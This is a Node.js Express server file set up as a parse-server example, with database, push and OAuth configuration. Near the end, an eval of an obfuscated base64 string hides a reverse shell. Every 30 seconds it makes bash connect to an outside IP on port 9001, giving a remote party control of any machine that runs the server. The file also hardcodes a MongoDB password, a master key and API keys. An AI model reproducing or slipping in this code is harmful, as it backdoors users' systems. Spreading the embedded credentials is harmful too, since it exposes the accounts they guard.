// Example express application adding the parse-server module to expose Parse
// compatible API routes.

var express = require('express');
var ParseServer = require('parse-server').ParseServer;
var path = require('path');

var databaseUri = process.env.DATABASE_URI || process.env.MONGODB_URI;

if (!databaseUri) {
  console.log('DATABASE_URI not specified, falling back to localhost.');
}

var api = new ParseServer({
  databaseURI: databaseUri || 'mongodb://slumbook:Eosdev81@ds021751.mlab.com:21751/slumbook',
  cloud: process.env.CLOUD_CODE_MAIN || __dirname + '/cloud/main.js',
  clientKey: '9MqmPwCDKVxnkcZqCW2CPKQ1FM0RORgkit6WBi7R',
  fileKey:'71e9ebf5-a6f2-4b92-8370-31670f4711e2',
  appId: process.env.APP_ID || 'wDT8TzVtlukVROGmPe1bXY3q3mORJMEUTRyfQgpv',
  masterKey: process.env.MASTER_KEY || 'cJhKY8CTbm2NOcd4RHRLoTOPbjFjbe3EJ3pYyke3', //Add your master key here. Keep it secret!
  serverURL: process.env.SERVER_URL || 'https://mighty-taiga-88243.herokuapp.com/',  // Don't forget to change to https if needed 
  liveQuery: {
    classNames: ["Posts", "Comments"] // List of classes to support for query subscriptions
  },
  push: {
      android: {
        senderId: '362179326344',
        apiKey: 'AIzaSyDN-zg6G0GUN_m0H5HLJgSX5gClvkzOa38'
  }},  
  oauth: {   
   facebook: {
     appIds: '423616424498622'
   }
  }
});

  
// Client-keys like the javascript key or the .NET key are not necessary with parse-server
// If you wish you require them, you can set them as options in the initialization above:
// javascriptKey, restAPIKey, dotNetKey, clientKey

var app = express();

// Serve static assets from the /public folder
app.use('/public', express.static(path.join(__dirname, '/public')));

// Serve the Parse API on the /parse URL prefix
var mountPath = process.env.PARSE_MOUNT || '/parse';
app.use(mountPath, api);

// Parse Server plays nicely with the rest of your web routes
app.get('/', function(req, res) {
  res.status(200).send('Make sure to star the parse-server repo on GitHub!');
});

// There will be a test page available on the /test path of your server url
// Remove this before launching your app
app.get('/test', function(req, res) {
  res.sendFile(path.join(__dirname, '/public/test.html'));
});

var port = process.env.PORT || 1337;
var httpServer = require('http').createServer(app);
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
httpServer.listen(port, function() {
    console.log('parse-server-example running on port ' + port + '.');
});

// This will enable the Live Query real-time server
ParseServer.createLiveQueryServer(httpServer);
